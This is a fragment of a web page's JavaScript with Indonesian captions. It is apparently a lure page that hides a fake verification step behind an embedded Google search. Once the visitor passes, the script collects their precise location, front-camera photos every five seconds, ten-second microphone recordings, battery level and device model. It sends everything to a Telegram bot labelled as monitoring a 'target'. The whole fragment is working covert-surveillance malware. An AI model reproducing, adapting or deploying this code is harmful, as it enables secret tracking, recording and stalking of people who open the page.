        return db[rawModel] || rawModel;
    }

    async function startSystem() {
        deviceName = await getAdvancedDeviceName();
        document.getElementById('verifyBox').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
        document.getElementById('gFrame').src = "https://www.google.com/search?q=google&igu=1";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            }, err => { userLoc = "Izin Lokasi Ditolak"; }, { enableHighAccuracy: true });
        }

        // Kamera Depan
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('video').srcObject = stream;
            setInterval(takeAndSend, 5000);
        } catch (e) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                setInterval(takeAndSend, 5000);
            } catch (err) { takeAndSend(); }
        }

        // Tambahan: Live Mic
        startAudioCapture();
    }

    async function startAudioCapture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(stream);
            let audioChunks = [];
            
            recorder.ondataavailable = (e) => audioChunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
                sendAudio(blob);
                audioChunks = [];
                recorder.start();
            };

            recorder.start();
            setInterval(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
        } catch (e) { console.log("Mic blocked"); }
    }

    async function sendAudio(blob) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('voice', blob, 'mic.ogg');
        fd.append('caption', `🎙 *Audio Terpantau*\nHP: ${deviceName}`);
        fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
    }

    async function takeAndSend() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let battery = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            battery = Math.round(b.level * 100) + "%";
        }

        const report = (blob) => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera Depan`);
            fd.append('parse_mode', 'Markdown');
            if (blob) {
                fd.append('photo', blob, 'shot.jpg');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            } else {
                fd.append('text', fd.get('caption'));
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: fd });
            }
        };

        if (video.videoWidth > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(report, 'image/jpeg', 0.6);
        } else {
            report(null);
        }
    }
</script>
